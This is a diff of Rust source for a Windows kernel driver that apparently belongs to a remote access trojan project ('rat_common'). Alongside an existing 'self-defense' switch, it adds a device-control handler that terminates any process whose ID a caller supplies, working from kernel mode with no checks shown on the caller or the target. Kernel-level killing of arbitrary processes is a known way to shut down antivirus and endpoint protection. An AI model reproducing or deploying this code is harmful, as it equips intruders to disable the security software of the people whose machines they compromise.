@@ -1,16 +1,20 @@
 use core::sync::atomic::{AtomicPtr, Ordering};
-use core::{mem, ptr};
+use core::{mem, ptr, slice};
 
-use rat_common::windows::IOCTL_START_DEFENSE;
+use rat_common::utils::DropGuard;
+use rat_common::windows::{IOCTL_START_DEFENSE, IOCTL_TERMINATE};
 use wdk::nt_success;
+use wdk_sys::_MODE::KernelMode;
 use wdk_sys::ntddk::{
-    IoCreateDevice, IoCreateSymbolicLink, IofCompleteRequest, RtlInitUnicodeString,
+    IoCreateDevice, IoCreateSymbolicLink, IofCompleteRequest, ObOpenObjectByPointer,
+    ObfDereferenceObject, PsLookupProcessByProcessId, RtlInitUnicodeString, ZwClose,
+    ZwTerminateProcess,
 };
 use wdk_sys::{
     DEVICE_OBJECT, DO_BUFFERED_IO, DO_DEVICE_INITIALIZING, FILE_DEVICE_SECURE_OPEN,
-    FILE_DEVICE_UNKNOWN, IO_NO_INCREMENT, IO_STACK_LOCATION, IRP, IRP_MJ_DEVICE_CONTROL, NTSTATUS,
-    PDEVICE_OBJECT, PDRIVER_OBJECT, PIRP, STATUS_INVALID_PARAMETER, STATUS_SUCCESS,
-    STATUS_UNSUCCESSFUL, UNICODE_STRING,
+    FILE_DEVICE_UNKNOWN, HANDLE, IO_NO_INCREMENT, IO_STACK_LOCATION, IRP, IRP_MJ_DEVICE_CONTROL,
+    NTSTATUS, OBJ_KERNEL_HANDLE, PDEVICE_OBJECT, PDRIVER_OBJECT, PIRP, STATUS_INVALID_PARAMETER,
+    STATUS_SUCCESS, STATUS_UNSUCCESSFUL, UNICODE_STRING,
 };
 
 use crate::cleanup::cleanup_device;
@@ -134,7 +138,7 @@ unsafe extern "C" fn device_control_handler(device: PDEVICE_OBJECT, irp: PIRP) -
 
 fn device_control_notify(
     _: &DEVICE_OBJECT,
-    _: &mut IRP,
+    irp: &mut IRP,
     irpsp: &mut IO_STACK_LOCATION,
 ) -> NTSTATUS {
     match unsafe { irpsp.Parameters.DeviceIoControl.IoControlCode } {
@@ -142,6 +146,59 @@ fn device_control_notify(
             info!("Activating self-defense");
             SELF_DEFENSE_ACTIVATED.store(true, Ordering::Release);
             STATUS_SUCCESS
+        }
+        IOCTL_TERMINATE => {
+            let buffer = unsafe {
+                slice::from_raw_parts(
+                    irp.AssociatedIrp.SystemBuffer.cast::<u8>(),
+                    irpsp.Parameters.DeviceIoControl.InputBufferLength as usize,
+                )
+            };
+
+            let buffer = match buffer.try_into() {
+                Ok(b) => b,
+                Err(_) => {
+                    return STATUS_INVALID_PARAMETER;
+                }
+            };
+
+            let pid = usize::from_le_bytes(buffer);
+
+            let mut process = ptr::null_mut();
+            let status = unsafe { PsLookupProcessByProcessId(pid as HANDLE, &mut process) };
+            if !nt_success(status) {
+                return status;
+            }
+
+            let guard1 = DropGuard::new(process, |p| unsafe {
+                ObfDereferenceObject(p.cast());
+            });
+
+            let mut handle = ptr::null_mut();
+            let status = unsafe {
+                ObOpenObjectByPointer(
+                    process.cast(),
+                    OBJ_KERNEL_HANDLE,
+                    ptr::null_mut(),
+                    0,
+                    ptr::null_mut(),
+                    KernelMode as i8,
+                    &mut handle,
+                )
+            };
+            if !nt_success(status) {
+                return status;
+            }
+
+            let guard2 = DropGuard::new(handle, |h| unsafe {
+                let _ = ZwClose(h);
+            });
+
+            let status = unsafe { ZwTerminateProcess(handle, 0) };
+
+            drop(guard2);
+            drop(guard1);
+            status
         }
         code => {
             error!("Unknown IOCTL code: 0x{code:X}");
